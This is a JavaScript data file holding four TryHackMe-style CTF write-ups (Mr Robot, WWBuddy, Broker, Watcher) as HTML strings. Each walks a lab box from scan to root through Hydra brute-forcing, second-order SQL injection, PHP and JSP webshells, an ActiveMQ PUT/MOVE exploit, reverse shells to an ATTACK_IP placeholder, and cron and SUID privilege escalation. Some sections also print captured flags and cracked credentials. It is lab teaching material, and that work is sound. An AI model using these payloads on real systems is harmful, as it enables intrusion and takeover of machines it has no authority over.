/* ============================================================
   0xmrerror.me — writeups data
   Kept in its own file so main.js stays lean and index.html stays small.
   Load this BEFORE main.js.
   ============================================================ */

'use strict';

const WRITEUPS = {
  'mr-robot': {
    title: 'Mr Robot CTF — WordPress to Root',
    meta: { diff: 'medium', platform: 'thm', time: '20 min' },
    content: `
<h2>Mr Robot CTF — WordPress to Root</h2>
<p>A WordPress blog with a leaked wordlist, weak credentials, a hidden base64 login, and the classic SUID <code>nmap</code> privesc. Goal: 3 keys.</p>

<h3>1 · Reconnaissance</h3>
<pre><code><span class="tok-comment"># Full port scan with services</span>
<span class="tok-func">nmap</span> -sC -sV -p- --min-rate 1000 10.10.x.x

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https</code></pre>

<h3>2 · Key 1 — robots.txt</h3>
<p><code>robots.txt</code> leaks two files: the first key and <code>fsocity.dic</code>, a wordlist we reuse later.</p>
<pre><code><span class="tok-func">curl</span> http://10.10.x.x/robots.txt

User-agent: *
fsocity.dic
key-1-of-3.txt

<span class="tok-func">wget</span> http://10.10.x.x/key-1-of-3.txt
<span class="tok-func">cat</span> key-1-of-3.txt
073403c8a58a1f80d943455fb30724b9</code></pre>

<h3>3 · WordPress Enumeration</h3>
<pre><code><span class="tok-func">gobuster</span> dir -u http://10.10.x.x -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

/wp-login   (Status: 200)
/wp-admin   (Status: 301)
/wp-content (Status: 301)

<span class="tok-comment"># fsocity.dic has ~858k words, mostly duplicates — dedup first</span>
<span class="tok-func">sort</span> fsocity.dic | <span class="tok-func">uniq</span> &gt; fs-clean.txt
<span class="tok-func">wc</span> -w fs-clean.txt   <span class="tok-comment"># 11451 unique words</span></code></pre>

<h3>4 · Brute-Forcing wp-login</h3>
<p>WordPress leaks whether a username exists (<code>Invalid username</code> vs wrong-password message). Find the user first, then crack the password with Hydra.</p>
<pre><code><span class="tok-comment"># 1) Find the username</span>
<span class="tok-func">hydra</span> -L fs-clean.txt -p test 10.10.x.x http-post-form \
  "/wp-login.php:log=^USER^&amp;pwd=^PASS^:F=Invalid username" -t 30
<span class="tok-comment"># &gt; username: elliot</span>

<span class="tok-comment"># 2) Crack the password</span>
<span class="tok-func">hydra</span> -l elliot -P fs-clean.txt 10.10.x.x http-post-form \
  "/wp-login.php:log=^USER^&amp;pwd=^PASS^:F=The password you entered for the username" -t 30
<span class="tok-comment"># &gt; creds: elliot : ER28-0652</span></code></pre>
<p><strong>Fast path:</strong> the <code>/license</code> page hides base64 that decodes straight to the same creds.</p>
<pre><code><span class="tok-func">echo</span> ZWxsaW90OkVSMjgtMDY1Mgo= | <span class="tok-func">base64</span> -d
<span class="tok-comment"># elliot:ER28-0652</span></code></pre>

<h3>5 · Reverse Shell via Theme Editor</h3>
<p>Logged in as admin, inject a PHP reverse shell into the theme: <strong>Appearance → Editor → 404.php</strong>. Paste pentestmonkey's shell, set your IP/port, save, then hit the template. Upgrade the dumb shell to a TTY.</p>
<pre><code><span class="tok-comment"># Attacker side — listener</span>
<span class="tok-func">nc</span> -lvnp 4444

<span class="tok-comment"># Trigger the shell</span>
http://10.10.x.x/wp-content/themes/twentyfifteen/404.php

<span class="tok-comment"># Upgrade TTY</span>
<span class="tok-func">python</span> -c <span class="tok-string">'import pty; pty.spawn("/bin/bash")'</span></code></pre>

<h3>6 · Pivot to the robot User</h3>
<p>Shell lands as <code>daemon</code>. <code>/home/robot</code> holds a hash file for the robot user and the key — readable only by robot.</p>
<pre><code><span class="tok-func">cd</span> /home/robot && <span class="tok-func">ls</span> -la
-r-------- 1 robot robot 33 key-2-of-3.txt
-rw-r--r-- 1 robot robot 39 password.raw-md5

<span class="tok-func">cat</span> password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b

<span class="tok-func">john</span> hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
<span class="tok-comment"># robot : abcdefghijklmnopqrstuvwxyz</span>

<span class="tok-func">su</span> robot
<span class="tok-func">cat</span> /home/robot/key-2-of-3.txt
822c73956184f694993bebb3eb32f0bf</code></pre>

<h3>7 · Privesc — SUID Nmap</h3>
<p>A GTFOBins classic. Old nmap ships an <code>--interactive</code> shell where <code>!</code> runs commands as the binary owner — and <code>/usr/local/bin/nmap</code> has the SUID bit.</p>
<pre><code><span class="tok-func">find</span> / -perm -u=s -type f 2&gt;/dev/null
/usr/local/bin/nmap   <span class="tok-comment"># &lt;-- SUID, owned by root</span>

/usr/local/bin/nmap --interactive
nmap&gt; !sh
<span class="tok-comment"># root shell</span>
<span class="tok-func">cat</span> /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4</code></pre>

<h3>8 · Retrospective</h3>
<p>Attack chain: <code>robots.txt</code> leak → WordPress weak creds → theme-editor shell → MD5 crack → SUID nmap. Key lessons: never ship wordlists publicly, watch for username-oracle login pages, and audit SUID binaries.</p>`
  },

  'ww-buddy': {
    title: 'WWBuddy — SQLi to Env-Var Privesc',
    meta: { diff: 'medium', platform: 'thm', time: '20 min' },
    content: `
<h2>WWBuddy — SQLi to Env-Var Privesc</h2>
<p>A "make friends" site still in development. The chain: a second-order SQL injection resets every password, an unsanitized username poisons an admin log into a PHP shell, a MySQL log leaks a password, and a SUID binary trusts the <code>USER</code> env var. Goal: 3 flags.</p>

<h3>1 · Enumeration</h3>
<pre><code><span class="tok-comment"># Map the room IP to a hostname</span>
<span class="tok-func">echo</span> "<span class="tok-string">10.10.x.x wwbuddy.thm</span>" &gt;&gt; /etc/hosts

<span class="tok-comment"># Port scan</span>
<span class="tok-func">nmap</span> -sV -sC wwbuddy.thm
PORT   STATE SERVICE VERSION
22/tcp open  ssh
80/tcp open  http   Apache

<span class="tok-comment"># Directory enum</span>
<span class="tok-func">gobuster</span> dir -u http://wwbuddy.thm/ -w /usr/share/wordlists/common.txt

/admin  /api  /register  /login  /profile</code></pre>

<h3>2 · Second-Order SQLi — Reset Everyone's Password</h3>
<p>The username is stored unsanitized and later reused inside a raw <code>UPDATE</code> query when you change your own password. Inject a username that makes the <code>WHERE</code> clause match every row — now all passwords become yours.</p>
<pre><code><span class="tok-comment"># 1) Register, then set your username to</span>
<span class="tok-keyword">' or 1=1-- -</span>

<span class="tok-comment"># 2) Change your password to a known value, e.g. adminadmin</span>

<span class="tok-comment"># 3) The backend effectively runs</span>
UPDATE users SET password = <span class="tok-string">'adminadmin'</span>
WHERE old_password = users.old_password
  AND username = <span class="tok-string">''</span> OR <span class="tok-num">1</span>=<span class="tok-num">1</span>-- -

<span class="tok-comment"># 4) Login as any known user — password is now adminadmin</span>
WWBuddy : adminadmin</code></pre>

<h3>3 · Log Poisoning → RCE</h3>
<p>Login as <code>WWBuddy</code> and plant a PHP one-liner as the username. Then log in as <code>Henry</code>, the account allowed into <code>/admin</code> — the dashboard prints every visitor's username unsanitized, so the payload is executed and a <code>cmd</code> parameter appears.</p>
<pre><code><span class="tok-comment"># Username to plant</span>
<span class="tok-string">&lt;?php system($_GET['cmd']); ?&gt;</span>

<span class="tok-comment"># Run commands through /admin</span>
http://wwbuddy.thm/admin/?cmd=<span class="tok-func">id</span>
uid=<span class="tok-num">33</span>(www-data) gid=<span class="tok-num">33</span>(www-data)

<span class="tok-comment"># Reverse shell — URL-encode this and pass it to cmd</span>
<span class="tok-func">bash</span> -i &gt;&amp; /dev/tcp/<span class="tok-string">ATTACK_IP</span>/<span class="tok-num">4444</span> <span class="tok-num">0</span>&gt;&amp;<span class="tok-num">1</span>

<span class="tok-comment"># Attacker listener</span>
<span class="tok-func">nc</span> -lvnp <span class="tok-num">4444</span></code></pre>

<h3>4 · www-data → roberto (MySQL log leak)</h3>
<p>Run <code>linpeas</code>. It surfaces <code>/var/log/mysql/general.log</code>, which records every query — including roberto typing his password into the username box by accident.</p>
<pre><code><span class="tok-func">grep</span> -i roberto /var/log/mysql/general.log
<span class="tok-comment"># &gt; roberto : &lt;password&gt;</span>

<span class="tok-func">ssh</span> roberto@wwbuddy.thm
<span class="tok-comment"># user flag</span>
<span class="tok-func">cat</span> /home/roberto/importante.txt
<span class="tok-comment"># THM{...}</span></code></pre>
<p><code>importante.txt</code> is in Portuguese (Roberto is Brazilian): "Jenny turns 26 next week". The web app uses <code>mm/dd/yyyy</code> as default passwords.</p>

<h3>5 · roberto → jenny (birthday bruteforce)</h3>
<pre><code><span class="tok-comment"># File modified ~Jul 27 2020 → Jenny's birthday in 08/01–08/09/1994</span>
<span class="tok-func">stat</span> /home/roberto/importante.txt | <span class="tok-func">grep</span> Modify

<span class="tok-comment"># Wordlist of candidate mm/dd/yyyy dates</span>
<span class="tok-func">seq</span> <span class="tok-num">1</span> <span class="tok-num">9</span> | <span class="tok-func">awk</span> <span class="tok-string">'{printf "08/0%d/1994\\n", $1}'</span> &gt; datelist.txt

<span class="tok-func">hydra</span> -l jenny -P datelist.txt wwbuddy.thm ssh
<span class="tok-func">ssh</span> jenny@wwbuddy.thm</code></pre>

<h3>6 · jenny → root (SUID + env injection)</h3>
<p><code>/bin/authenticate</code> is SUID-root. Reversing it (Ghidra) shows it builds <code>usermod -G developer &lt;name&gt;</code> from the <code>USER</code> env var and feeds it to <code>system()</code> — so the var itself becomes our injection point.</p>
<pre><code><span class="tok-comment"># Spot the unusual SUID binary</span>
<span class="tok-func">find</span> / -type f -perm -4000 2&gt;/dev/null
/bin/authenticate   <span class="tok-comment"># SUID, owned by root</span>

<span class="tok-comment"># Inject a shell through the env var</span>
<span class="tok-func">export</span> USER=<span class="tok-string">"jenny; bash"</span>
/bin/authenticate

<span class="tok-comment"># root shell — read the flag</span>
root@wwbuddy:~# <span class="tok-func">cat</span> /root/root.txt
<span class="tok-comment"># THM{...}</span></code></pre>

<h3>7 · Retrospective</h3>
<p>Attack chain: second-order SQLi password reset → log-poisoned PHP shell → MySQL log credential leak → birthday bruteforce → SUID env-var injection. Lessons: sanitize every place a username is reused, keep MySQL's general log off, and never trust environment variables in SUID binaries.</p>`
  },

  'broker': {
    title: 'Broker — MQTT Eavesdrop to Webshell',
    meta: { diff: 'medium', platform: 'thm', time: '15 min' },
    content: `
<h2>Broker — MQTT Eavesdrop to Root</h2>
<p>An ActiveMQ server with two exposed services: an MQTT broker that lets anyone subscribe, and a management console with a classic put-shell CVE. Paul and Max thought they were being sneaky. Goal: flag.txt + root.txt.</p>

<h3>1 · Enumeration</h3>
<pre><code><span class="tok-comment"># The hint says the action is on high ports</span>
<span class="tok-func">nmap</span> -sC -sV -p 1001-9999 broker.thm

PORT    STATE SERVICE
1883/tcp open  mqtt
8161/tcp open  http   Jetty 9 (Apache ActiveMQ 5.9.0)</code></pre>

<h3>2 · ActiveMQ Console</h3>
<p>Port 8161 hosts an Apache ActiveMQ dashboard. The default <code>admin:admin</code> works. The <strong>Topics</strong> tab lists a <code>secret_chat</code> topic — that has to be where the "secret" messages flow.</p>

<h3>3 · Eavesdropping on MQTT</h3>
<p>The MQTT broker needs no credentials, so we subscribe to the topic with the Mosquitto client and read the conversation.</p>
<pre><code><span class="tok-func">mosquitto_sub</span> -h broker.thm -t <span class="tok-string">'secret_chat/#'</span> -p <span class="tok-num">1883</span> -V mqttv31
<span class="tok-comment"># &gt; Paul and Max chat about... the game "Hacknet"</span></code></pre>

<h3>4 · CVE-2016-3088 — PUT/MOVE Webshell</h3>
<p>ActiveMQ's <code>/fileserver</code> accepts an HTTP <code>PUT</code> upload but won't execute what's stored there. So we upload a JSP webshell and <code>MOVE</code> it into <code>/admin</code>, which does execute JSP. First leak the absolute path via the <code>%20</code> trick.</p>
<pre><code><span class="tok-comment"># Upload cmd.jsp to /fileserver</span>
<span class="tok-func">curl</span> -u admin:admin -X <span class="tok-keyword">PUT</span> <span class="tok-string">"http://broker.thm:8161/fileserver/cmd.jsp"</span> \
  --data @cmd.jsp -H <span class="tok-string">'Content-Type: text/plain'</span>

<span class="tok-comment"># Leak the absolute path</span>
<span class="tok-func">curl</span> -u admin:admin -X <span class="tok-keyword">GET</span> <span class="tok-string">"http://broker.thm:8161/fileserver/test/%20/%20"</span>
<span class="tok-comment"># &gt; /opt/apache-activemq-5.9.0/webapps/fileserver/</span>

<span class="tok-comment"># MOVE the shell into the executable /admin directory</span>
<span class="tok-func">curl</span> -u admin:admin -X <span class="tok-keyword">MOVE</span> <span class="tok-string">"http://broker.thm:8161/fileserver/cmd.jsp"</span> \
  -H <span class="tok-string">"Destination: http://broker.thm:8161/admin/cmd.jsp"</span>

<span class="tok-comment"># RCE</span>
http://broker.thm:8161/admin/cmd.jsp?cmd=<span class="tok-func">id</span></code></pre>

<h3>5 · Reverse Shell</h3>
<p>Long bash one-liners often get mangled by URL encoding here. Use <code>nc -e</code> or host a <code>msfvenom</code>-generated ELF and fetch it with curl. Then upgrade the TTY.</p>
<pre><code><span class="tok-comment"># Attacker listener</span>
<span class="tok-func">nc</span> -lvnp <span class="tok-num">4444</span>

<span class="tok-comment"># Payload (URL-encode spaces) through the webshell</span>
<span class="tok-func">nc</span> -e /bin/bash <span class="tok-string">ATTACK_IP</span> <span class="tok-num">4444</span>

<span class="tok-comment"># Upgrade TTY, then read the user flag</span>
<span class="tok-func">python3</span> -c <span class="tok-string">'import pty; pty.spawn("/bin/bash")'</span>
<span class="tok-func">cat</span> /home/activemq/flag.txt
<span class="tok-comment"># THM{...}</span></code></pre>

<h3>6 · Privesc — Writable Sudo Script</h3>
<p><code>sudo -l</code> shows activemq can run <code>subscribe.py</code> as root with no password — and the file is owned (and writable) by activemq. Append code that drops a shell.</p>
<pre><code><span class="tok-func">sudo</span> -l
(root) NOPASSWD: /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py
<span class="tok-func">ls</span> -l /opt/apache-activemq-5.9.0/subscribe.py
-rw-rw-r-- <span class="tok-num">1</span> activemq activemq <span class="tok-num">768</span> subscribe.py

<span class="tok-func">echo</span> <span class="tok-string">'import os; os.system("/bin/bash")'</span> &gt;&gt; /opt/apache-activemq-5.9.0/subscribe.py

<span class="tok-func">sudo</span> -u root /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py
<span class="tok-comment"># &gt; root shell</span>
root@broker:~# <span class="tok-func">cat</span> /root/root.txt
<span class="tok-comment"># THM{...}</span></code></pre>

<h3>7 · Retrospective</h3>
<p>Attack chain: default ActiveMQ creds → MQTT eavesdrop → PUT/MOVE webshell (CVE-2016-3088) → writable sudo script. Lessons: never run a broker with null auth, lock down <code>/fileserver</code>, and audit what your own user-scripted sudo targets.</p>`
  },

  'watcher': {
    title: 'Watcher — LFI to Root in 7 Flags',
    meta: { diff: 'medium', platform: 'thm', time: '30 min' },
    content: `
<h2>Watcher — LFI to Root in 7 Flags</h2>
<p>A boot2root with a long, linear privilege chain: LFI turns into a webshell, then a series of sudo/cron pivots, ending with a root SSH key. Goal: 7 flags.</p>

<h3>1 · Enumeration</h3>
<pre><code><span class="tok-func">nmap</span> -sC -sV watcher.thm
PORT   STATE SERVICE VERSION
21/tcp open  ftp    vsftpd 3.0.3
22/tcp open  ssh
80/tcp open  http   Apache</code></pre>

<h3>2 · LFI → FTP Credentials</h3>
<p><code>post.php</code> does a raw <code>include $_GET["post"]</code> — instant LFI. Use it to read <code>robots.txt</code>, which points to <code>secret_file_do_not_read.txt</code>, which leaks FTP credentials and the upload path.</p>
<pre><code><span class="tok-comment"># Any file, no filtering</span>
http://watcher.thm/post.php?post=<span class="tok-string">/etc/passwd</span>

<span class="tok-comment"># robots → secret file → FTP creds</span>
http://watcher.thm/post.php?post=robots.txt
<span class="tok-comment"># Allow: /flag_1.txt | Allow: /secret_file_do_not_read.txt</span>
http://watcher.thm/post.php?post=secret_file_do_not_read.txt
<span class="tok-comment"># &gt; ftpuser : &lt;password&gt; — files go to /home/ftpuser/ftp/files</span></code></pre>

<h3>3 · FTP Upload → Reverse Shell</h3>
<p>Log into FTP: grab <code>flag_2.txt</code>, then <code>put</code> a PHP reverse shell into the writable <code>files/</code> directory. Trigger it through the LFI using the path from the note.</p>
<pre><code><span class="tok-func">ftp</span> watcher.thm
&gt; get flag_2.txt
&gt; cd files
&gt; put shell.php

<span class="tok-comment"># Listener + trigger via LFI</span>
<span class="tok-func">nc</span> -lvnp <span class="tok-num">4444</span>
http://watcher.thm/post.php?post=<span class="tok-string">../../../../home/ftpuser/ftp/files/shell.php</span>
<span class="tok-comment"># &gt; shell as www-data — flag_3.txt in /var/www/html/more_secrets_a9f10a/</span></code></pre>

<h3>4 · www-data → toby</h3>
<pre><code><span class="tok-comment"># Passwordless sudo to toby</span>
<span class="tok-func">sudo</span> -u toby /bin/bash
<span class="tok-comment"># &gt; toby shell — flag_4.txt in /home/toby</span></code></pre>

<h3>5 · toby → mat (cron poisoning)</h3>
<p><code>/etc/crontab</code> runs <code>/home/toby/jobs/cow.sh</code> as user <code>mat</code> every minute. As toby we can overwrite it with a reverse shell and wait.</p>
<pre><code><span class="tok-func">cat</span> /etc/crontab
<span class="tok-comment"># * * * * * mat /home/toby/jobs/cow.sh</span>

<span class="tok-func">echo</span> <span class="tok-string">'/bin/bash -i &gt;&amp; /dev/tcp/ATTACK_IP/5555 0&gt;&amp;1'</span> &gt; /home/toby/jobs/cow.sh
<span class="tok-func">chmod</span> +x /home/toby/jobs/cow.sh
<span class="tok-comment"># &gt; wait a minute → mat shell → flag_5.txt</span></code></pre>

<h3>6 · mat → will (module injection)</h3>
<p>Will left a note: mat may run <code>will_script.py</code> as will via sudo. It imports <code>get_command</code> from a local <code>cmd.py</code> that mat can edit — override the function to drop a shell while still returning a whitelisted command.</p>
<pre><code><span class="tok-func">sudo</span> -l
<span class="tok-comment"># (will) /usr/bin/python3 /home/mat/scripts/will_script.py</span>

<span class="tok-func">cat</span> &gt; /home/mat/scripts/cmd.py &lt;&lt; <span class="tok-string">'EOF'</span>
<span class="tok-keyword">import</span> os
<span class="tok-keyword">def</span> <span class="tok-func">get_command</span>(num):
    os.system(<span class="tok-string">"/bin/bash -i"</span>)
    <span class="tok-keyword">return</span> <span class="tok-string">"id"</span>
EOF

<span class="tok-func">sudo</span> -u will /usr/bin/python3 /home/mat/scripts/will_script.py <span class="tok-num">1</span>
<span class="tok-comment"># &gt; will shell — flag_6.txt</span></code></pre>

<h3>7 · will → root (base64 SSH key)</h3>
<p>User <code>will</code> is in the <code>adm</code> group, which can read <code>/opt/backups/</code>. Inside is <code>key.b64</code> — decode it and it's an RSA private key for root.</p>
<pre><code><span class="tok-func">id</span>
uid=<span class="tok-num">1000</span>(will) groups=<span class="tok-num">1000</span>(will),<span class="tok-num">4</span>(adm)

<span class="tok-func">ls</span> /opt/backups
key.b64

<span class="tok-func">base64</span> -d key.b64 &gt; key
<span class="tok-func">file</span> key   <span class="tok-comment"># PEM RSA private key</span>
<span class="tok-func">chmod</span> <span class="tok-num">600</span> key
<span class="tok-func">ssh</span> -i key root@localhost
<span class="tok-comment"># &gt; root — final flag</span></code></pre>

<h3>8 · Retrospective</h3>
<p>Attack chain: LFI → FTP creds → uploaded PHP shell → sudo/cron pivots (www-data→toby→mat→will) → base64 root key. Lessons: raw <code>include</code> is a shell factory, cron scripts must not be world-writable, and running python <code>while</code> importing a file your users can edit is a root factory.</p>`
  }
};